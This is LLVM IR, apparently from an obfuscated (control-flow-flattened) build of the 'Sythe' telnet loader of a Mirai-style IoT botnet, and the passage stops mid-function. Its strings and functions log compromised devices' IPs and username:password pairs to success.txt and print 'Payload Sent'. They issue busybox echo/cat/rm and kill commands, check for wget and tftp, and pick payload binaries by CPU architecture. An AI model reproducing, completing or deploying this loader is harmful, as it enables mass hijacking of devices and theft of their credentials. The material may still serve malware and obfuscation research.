; ModuleID = 'host/ir_fla/Sythe.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%struct.elf_hdr = type { [16 x i8], i16, i16, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fileeeee = common global %struct._IO_FILE* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"srv == NULL\0A\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.1 = private unnamed_addr constant [42 x i8] c"Payload Sent --> %d.%d.%d.%d:%d %s:%s %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"success.txt\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"%d.%d.%d.%d:%d %s:%s\0A\00", align 1
@connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"ECCHI: applet not found\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"init\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"[init]\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"/bin/busybox kill -9 %d\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"rw\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"\5Cx6b\5Cx61\5Cx6d\5Cx69\00", align 1
@.str.16 = private unnamed_addr constant [108 x i8] c"/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"/bin/busybox ECCHI\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"kami\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.20 = private unnamed_addr constant [36 x i8] c"rm %s/.t; rm %s/.sh; rm %s/.human\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"ELF\00", align 1
@.str.22 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.26 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.28 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.31 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.33 = private unnamed_addr constant [23 x i8] c"wget: applet not found\00", align 1
@.str.34 = private unnamed_addr constant [23 x i8] c"tftp: applet not found\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.35 = private unnamed_addr constant [44 x i8] c"echo -ne '%s' %s upnp; /bin/busybox ECCHI\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [18 x i8] c"Permission denied\00", align 1
@.str.39 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"illegal option\00", align 1
@.str.41 = private unnamed_addr constant [24 x i8] c"IHCCE: applet not found\00", align 1
@.str.42 = private unnamed_addr constant [15 x i8] c"listening tun0\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @connection_open(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 9
  store i16 0, i16* %7, align 8
  %8 = call i64 @time(i64* null) #5
  %9 = load %struct.connection*, %struct.connection** %2, align 8
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %9, i32 0, i32 6
  store i64 %8, i64* %10, align 8
  %11 = load %struct.connection*, %struct.connection** %2, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 10
  store i16 10, i16* %12, align 2
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 5
  store i32 0, i32* %14, align 4
  %15 = load %struct.connection*, %struct.connection** %2, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 7
  store i32 1, i32* %16, align 8
  %17 = load %struct.connection*, %struct.connection** %2, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 12
  store i8 0, i8* %18, align 1
  %19 = load %struct.connection*, %struct.connection** %2, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 11
  store i8 1, i8* %20, align 4
  %21 = load %struct.connection*, %struct.connection** %2, align 8
  %22 = getelementptr inbounds %struct.connection, %struct.connection* %21, i32 0, i32 2
  store %struct.binary* null, %struct.binary** %22, align 8
  %23 = load %struct.connection*, %struct.connection** %2, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 5
  store i32 0, i32* %24, align 4
  %25 = load %struct.connection*, %struct.connection** %2, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 0
  %27 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %26) #5
  ret void
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) #1

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) #1

; Function Attrs: noinline nounwind uwtable
define void @connection_close(%struct.connection*) #0 {
  %.reg2mem = alloca i8
  %2 = alloca %struct.connection*, align 8
  store %struct.connection* %0, %struct.connection** %2, align 8
  %3 = load %struct.connection*, %struct.connection** %2, align 8
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %3, i32 0, i32 0
  %5 = call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %4) #5
  %6 = load %struct.connection*, %struct.connection** %2, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %6, i32 0, i32 11
  %8 = load i8, i8* %7, align 4
  store i8 %8, i8* %.reg2mem
  %switchVar = alloca i32
  store i32 -663230975, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -663230975, label %first
    i32 1876338745, label %11
    i32 141310850, label %37
    i32 -490741517, label %39
    i32 1911283127, label %45
    i32 1299491902, label %136
    i32 -1092851355, label %142
    i32 1717249993, label %143
    i32 993000579, label %151
    i32 1610097286, label %163
    i32 -1593555327, label %167
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8, i8* %.reg2mem
  %9 = icmp ne i8 %.reload, 0
  %10 = select i1 %9, i32 1876338745, i32 1717249993
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load %struct.connection*, %struct.connection** %2, align 8
  %13 = getelementptr inbounds %struct.connection, %struct.connection* %12, i32 0, i32 8
  %14 = getelementptr inbounds %struct.anon, %struct.anon* %13, i32 0, i32 0
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %14, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %15, i8 0, i64 512, i32 4, i1 false)
  %16 = load %struct.connection*, %struct.connection** %2, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 8
  %18 = getelementptr inbounds %struct.anon, %struct.anon* %17, i32 0, i32 1
  store i32 0, i32* %18, align 4
  %19 = load %struct.connection*, %struct.connection** %2, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 6
  store i64 0, i64* %20, align 8
  %21 = load %struct.connection*, %struct.connection** %2, align 8
  %22 = getelementptr inbounds %struct.connection, %struct.connection* %21, i32 0, i32 11
  store i8 0, i8* %22, align 4
  %23 = load %struct.connection*, %struct.connection** %2, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 13
  store i8 0, i8* %24, align 2
  %25 = load %struct.connection*, %struct.connection** %2, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 14
  store i8 0, i8* %26, align 1
  %27 = load %struct.connection*, %struct.connection** %2, align 8
  %28 = getelementptr inbounds %struct.connection, %struct.connection* %27, i32 0, i32 15
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 8192, i32 8, i1 false)
  %30 = load %struct.connection*, %struct.connection** %2, align 8
  %31 = getelementptr inbounds %struct.connection, %struct.connection* %30, i32 0, i32 9
  store i16 0, i16* %31, align 8
  %32 = load %struct.connection*, %struct.connection** %2, align 8
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %32, i32 0, i32 1
  %34 = load %struct.server*, %struct.server** %33, align 8
  %35 = icmp eq %struct.server* %34, null
  %36 = select i1 %35, i32 141310850, i32 -490741517
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))
  store i32 -1593555327, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load %struct.connection*, %struct.connection** %2, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 12
  %42 = load i8, i8* %41, align 1
  %43 = icmp ne i8 %42, 0
  %44 = select i1 %43, i32 1911283127, i32 1299491902
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load %struct.connection*, %struct.connection** %2, align 8
  %47 = getelementptr inbounds %struct.connection, %struct.connection* %46, i32 0, i32 1
  %48 = load %struct.server*, %struct.server** %47, align 8
  %49 = getelementptr inbounds %struct.server, %struct.server* %48, i32 0, i32 7
  %50 = atomicrmw add i32* %49, i32 1 seq_cst
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %52 = load %struct.connection*, %struct.connection** %2, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 3
  %54 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = and i32 %55, 255
  %57 = load %struct.connection*, %struct.connection** %2, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 3
  %59 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %58, i32 0, i32 4
  %60 = load i32, i32* %59, align 8
  %61 = lshr i32 %60, 8
  %62 = and i32 %61, 255
  %63 = load %struct.connection*, %struct.connection** %2, align 8
  %64 = getelementptr inbounds %struct.connection, %struct.connection* %63, i32 0, i32 3
  %65 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %64, i32 0, i32 4
  %66 = load i32, i32* %65, align 8
  %67 = lshr i32 %66, 16
  %68 = and i32 %67, 255
  %69 = load %struct.connection*, %struct.connection** %2, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 3
  %71 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %70, i32 0, i32 4
  %72 = load i32, i32* %71, align 8
  %73 = lshr i32 %72, 24
  %74 = and i32 %73, 255
  %75 = load %struct.connection*, %struct.connection** %2, align 8
  %76 = getelementptr inbounds %struct.connection, %struct.connection* %75, i32 0, i32 3
  %77 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %76, i32 0, i32 5
  %78 = load i16, i16* %77, align 4
  %79 = zext i16 %78 to i32
  %80 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %79)
  %81 = load %struct.connection*, %struct.connection** %2, align 8
  %82 = getelementptr inbounds %struct.connection, %struct.connection* %81, i32 0, i32 3
  %83 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %82, i32 0, i32 0
  %84 = getelementptr inbounds [32 x i8], [32 x i8]* %83, i32 0, i32 0
  %85 = load %struct.connection*, %struct.connection** %2, align 8
  %86 = getelementptr inbounds %struct.connection, %struct.connection* %85, i32 0, i32 3
  %87 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %86, i32 0, i32 1
  %88 = getelementptr inbounds [32 x i8], [32 x i8]* %87, i32 0, i32 0
  %89 = load %struct.connection*, %struct.connection** %2, align 8
  %90 = getelementptr inbounds %struct.connection, %struct.connection* %89, i32 0, i32 3
  %91 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %90, i32 0, i32 2
  %92 = getelementptr inbounds [6 x i8], [6 x i8]* %91, i32 0, i32 0
  %93 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %51, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i32 0, i32 0), i32 %56, i32 %62, i32 %68, i32 %74, i32 %80, i8* %84, i8* %88, i8* %92)
  %94 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i32 0, i32 0))
  store %struct._IO_FILE* %94, %struct._IO_FILE** @fileeeee, align 8
  %95 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %96 = load %struct.connection*, %struct.connection** %2, align 8
  %97 = getelementptr inbounds %struct.connection, %struct.connection* %96, i32 0, i32 3
  %98 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %97, i32 0, i32 4
  %99 = load i32, i32* %98, align 8
  %100 = and i32 %99, 255
  %101 = load %struct.connection*, %struct.connection** %2, align 8
  %102 = getelementptr inbounds %struct.connection, %struct.connection* %101, i32 0, i32 3
  %103 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %102, i32 0, i32 4
  %104 = load i32, i32* %103, align 8
  %105 = lshr i32 %104, 8
  %106 = and i32 %105, 255
  %107 = load %struct.connection*, %struct.connection** %2, align 8
  %108 = getelementptr inbounds %struct.connection, %struct.connection* %107, i32 0, i32 3
  %109 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %108, i32 0, i32 4
  %110 = load i32, i32* %109, align 8
  %111 = lshr i32 %110, 16
  %112 = and i32 %111, 255
  %113 = load %struct.connection*, %struct.connection** %2, align 8
  %114 = getelementptr inbounds %struct.connection, %struct.connection* %113, i32 0, i32 3
  %115 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %114, i32 0, i32 4
  %116 = load i32, i32* %115, align 8
  %117 = lshr i32 %116, 24
  %118 = and i32 %117, 255
  %119 = load %struct.connection*, %struct.connection** %2, align 8
  %120 = getelementptr inbounds %struct.connection, %struct.connection* %119, i32 0, i32 3
  %121 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %120, i32 0, i32 5
  %122 = load i16, i16* %121, align 4
  %123 = zext i16 %122 to i32
  %124 = call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %123)
  %125 = load %struct.connection*, %struct.connection** %2, align 8
  %126 = getelementptr inbounds %struct.connection, %struct.connection* %125, i32 0, i32 3
  %127 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %126, i32 0, i32 0
  %128 = getelementptr inbounds [32 x i8], [32 x i8]* %127, i32 0, i32 0
  %129 = load %struct.connection*, %struct.connection** %2, align 8
  %130 = getelementptr inbounds %struct.connection, %struct.connection* %129, i32 0, i32 3
  %131 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %130, i32 0, i32 1
  %132 = getelementptr inbounds [32 x i8], [32 x i8]* %131, i32 0, i32 0
  %133 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %95, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i32 0, i32 0), i32 %100, i32 %106, i32 %112, i32 %118, i32 %124, i8* %128, i8* %132)
  %134 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %135 = call i32 @fclose(%struct._IO_FILE* %134)
  store i32 -1092851355, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load %struct.connection*, %struct.connection** %2, align 8
  %138 = getelementptr inbounds %struct.connection, %struct.connection* %137, i32 0, i32 1
  %139 = load %struct.server*, %struct.server** %138, align 8
  %140 = getelementptr inbounds %struct.server, %struct.server* %139, i32 0, i32 8
  %141 = atomicrmw add i32* %140, i32 1 seq_cst
  store i32 -1092851355, i32* %switchVar
  br label %loopEnd

; <label>:142:                                    ; preds = %loopEntry
  store i32 1717249993, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.connection*, %struct.connection** %2, align 8
  %145 = getelementptr inbounds %struct.connection, %struct.connection* %144, i32 0, i32 7
  store i32 0, i32* %145, align 8
  %146 = load %struct.connection*, %struct.connection** %2, align 8
  %147 = getelementptr inbounds %struct.connection, %struct.connection* %146, i32 0, i32 4
  %148 = load i32, i32* %147, align 8
  %149 = icmp ne i32 %148, -1
  %150 = select i1 %149, i32 993000579, i32 1610097286
  store i32 %150, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load %struct.connection*, %struct.connection** %2, align 8
  %153 = getelementptr inbounds %struct.connection, %struct.connection* %152, i32 0, i32 4
  %154 = load i32, i32* %153, align 8
  %155 = call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %154)
  %156 = load %struct.connection*, %struct.connection** %2, align 8
  %157 = getelementptr inbounds %struct.connection, %struct.connection* %156, i32 0, i32 4
  store i32 -1, i32* %157, align 8
  %158 = load %struct.connection*, %struct.connection** %2, align 8
  %159 = getelementptr inbounds %struct.connection, %struct.connection* %158, i32 0, i32 1
  %160 = load %struct.server*, %struct.server** %159, align 8
  %161 = getelementptr inbounds %struct.server, %struct.server* %160, i32 0, i32 1
  %162 = atomicrmw sub i32* %161, i32 1 seq_cst
  store i32 1610097286, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load %struct.connection*, %struct.connection** %2, align 8
  %165 = getelementptr inbounds %struct.connection, %struct.connection* %164, i32 0, i32 0
  %166 = call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %165) #5
  store i32 -1593555327, i32* %switchVar
  br label %loopEnd

; <label>:167:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %163, %151, %143, %142, %136, %45, %39, %37, %11, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

declare i32 @printf(i8*, ...) #3

declare i32 @ntohs(...) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @close(...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_iacs(%struct.connection*) #0 {
  %2 = alloca %struct.connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.connection* %0, %struct.connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.connection*, %struct.connection** %2, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 15
  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  %switchVar = alloca i32
  store i32 1705361883, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1705361883, label %11
    i32 -1976417018, label %19
    i32 -1764030900, label %25
    i32 619442722, label %26
    i32 948596272, label %32
    i32 -2010855731, label %38
    i32 620711765, label %39
    i32 1070648739, label %46
    i32 1457635907, label %51
    i32 437798589, label %58
    i32 695699710, label %66
    i32 18829083, label %67
    i32 993283516, label %74
    i32 -1681046444, label %75
    i32 1665403145, label %90
    i32 -1800914556, label %91
    i32 2050430461, label %97
    i32 -1885975050, label %98
    i32 346270788, label %99
    i32 1456088637, label %103
    i32 -2028991740, label %112
    i32 -1623530881, label %117
    i32 1260904576, label %126
    i32 144608073, label %131
    i32 373842580, label %132
    i32 1623693867, label %133
    i32 -529779253, label %136
    i32 -1368386453, label %146
    i32 1630311256, label %147
    i32 -1208409238, label %148
    i32 -840650730, label %149
    i32 -2003634413, label %150
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.connection*, %struct.connection** %2, align 8
  %14 = getelementptr inbounds %struct.connection, %struct.connection* %13, i32 0, i32 9
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = icmp slt i32 %12, %16
  %18 = select i1 %17, i32 -1976417018, i32 -2003634413
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8*, i8** %4, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 255
  %24 = select i1 %23, i32 -1764030900, i32 619442722
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  store i32 -2003634413, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %4, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 255
  %31 = select i1 %30, i32 948596272, i32 -1208409238
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load %struct.connection*, %struct.connection** %2, align 8
  %34 = load i8*, i8** %4, align 8
  %35 = call signext i8 @can_consume(%struct.connection* %33, i8* %34, i32 1)
  %36 = icmp ne i8 %35, 0
  %37 = select i1 %36, i32 620711765, i32 -2010855731
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 -2003634413, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8*, i8** %4, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 255
  %45 = select i1 %44, i32 1070648739, i32 1457635907
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %4, align 8
  %48 = getelementptr inbounds i8, i8* %47, i64 2
  store i8* %48, i8** %4, align 8
  %49 = load i32, i32* %3, align 4
  %50 = add nsw i32 %49, 2
  store i32 %50, i32* %3, align 4
  store i32 1705361883, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i8*, i8** %4, align 8
  %53 = getelementptr inbounds i8, i8* %52, i64 1
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 253
  %57 = select i1 %56, i32 437798589, i32 1665403145
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %59, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @connection_consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %60 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %60, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @connection_consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %61 = load %struct.connection*, %struct.connection** %2, align 8
  %62 = load i8*, i8** %4, align 8
  %63 = call signext i8 @can_consume(%struct.connection* %61, i8* %62, i32 2)
  %64 = icmp ne i8 %63, 0
  %65 = select i1 %64, i32 18829083, i32 695699710
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -2003634413, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %4, align 8
  %69 = getelementptr inbounds i8, i8* %68, i64 2
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp ne i32 %71, 31
  %73 = select i1 %72, i32 993283516, i32 -1681046444
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  store i32 -1800914556, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i8*, i8** %4, align 8
  %77 = getelementptr inbounds i8, i8* %76, i64 3
  store i8* %77, i8** %4, align 8
  %78 = load i32, i32* %3, align 4
  %79 = add nsw i32 %78, 3
  store i32 %79, i32* %3, align 4
  %80 = load %struct.connection*, %struct.connection** %2, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 4
  %82 = load i32, i32* %81, align 8
  %83 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %84 = call i64 @send(i32 %82, i8* %83, i64 3, i32 16384)
  %85 = load %struct.connection*, %struct.connection** %2, align 8
  %86 = getelementptr inbounds %struct.connection, %struct.connection* %85, i32 0, i32 4
  %87 = load i32, i32* %86, align 8
  %88 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %89 = call i64 @send(i32 %87, i8* %88, i64 9, i32 16384)
  store i32 -1368386453, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 -1800914556, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load %struct.connection*, %struct.connection** %2, align 8
  %93 = load i8*, i8** %4, align 8
  %94 = call signext i8 @can_consume(%struct.connection* %92, i8* %93, i32 2)
  %95 = icmp ne i8 %94, 0
  %96 = select i1 %95, i32 -1885975050, i32 2050430461
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 -2003634413, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 346270788, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %5, align 4
  %101 = icmp slt i32 %100, 3
  %102 = select i1 %101, i32 1456088637, i32 -529779253
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %4, align 8
  %105 = load i32, i32* %5, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 253
